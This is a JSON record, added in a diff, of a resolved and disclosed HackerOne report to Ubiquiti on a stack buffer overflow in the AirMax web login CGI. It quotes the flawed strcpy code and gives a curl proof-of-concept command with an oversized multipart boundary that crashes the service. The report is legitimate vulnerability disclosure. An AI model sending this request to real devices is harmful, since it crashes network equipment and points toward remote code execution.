@@ -1,0 +1,104 @@
+{
+  "id": 74004,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDAwNA==",
+  "url": "https://hackerone.com/reports/74004",
+  "title": "Other Buffer Overflow in PHP of the AirMax Products",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-07-05T12:29:51.207Z",
+  "submitted_at": "2015-07-05T12:29:51.207Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rbran",
+    "url": "/rbran",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 800,
+    "url": "https://hackerone.com/ui",
+    "handle": "ui",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ubiquiti Inc.",
+      "twitter_handle": "ubiquiti",
+      "website": "https://ui.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-04-07T21:59:06.653Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-03-08T21:58:48.841Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "tldr: Just like happen in Report [73491](https://hackerone.com/reports/73491), but **MUCH WORSE**.\r\n\r\n#The Vulnerability\r\nAfter the Report [73491](https://hackerone.com/reports/73491), I decided to take another look in the code on  files`post.c` and `uploadbuffer.c` (once I have nothing better to do than watch F1).\r\n\r\nThe problematic code:\r\n```\r\nchar *getpost(void) {\r\n/* Some Code */\r\n\tchar *mb;\r\n\tchar boundary[100];\r\n\r\n/* Some Code */\r\n\tif(!strncasecmp(buf,\"multipart/form-data\",19)) {\r\n\t\tfile_upload=1;\r\n\t\tmb = strchr(buf,'=');\r\n\t\tif(mb) strcpy(boundary,mb+1);\t//!!The problematic Line!!\r\n\t\telse {\r\n\t\t\tError(\"File Upload Error: No MIME boundary found\"); \r\n\t\t\t/* Some Code */\r\n\t\t\treturn(NULL);\r\n\t\t}\r\n\t}\r\n/* Rest of the Code */\r\n}\r\n```\r\nHas you can see, it's copied the string in `mb+1` to `boundary` ( witch have a fixed size), so will cause a **Buffer Overflow** if the string in `mb` (here represent `boundary` camp in a POST request) it's bigger than 100 bytes. In a **Buffer Overflow** which happen in stack memory, do a remote code execution should be easy (Even more on a AirMax, once the equipment are almost identical).\r\n\r\n#Reproduce\r\nI will not create a exploit to this report, but unlike the Report [73491](https://hackerone.com/reports/73491), you just have to ask for one.\r\n\r\nThis Curl command will cause a buffer overflow.\r\n```\r\ncurl -X POST -H \"Content-Type: multipart/form-data; boundary=----------------------------dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\" --data-binary AnyDataHERE \"https://192.168.1.20/login.cgi\" -k -v\r\n```\r\nObs: Some times you need a bigger `boundary` (more `d`!!).\r\n\r\nThe lighttpd will return `(mod_cgi.c.1319) cleaning up CGI: process died with signal 11`.",
+  "weakness": {
+    "id": 2,
+    "name": "Memory Corruption - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-04-07T21:58:48.949Z",
+  "allow_singular_disclosure_after": -247758240.7155435,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "shivammusic",
+    "dyabla",
+    "002mastercodex61511",
+    "prowser"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
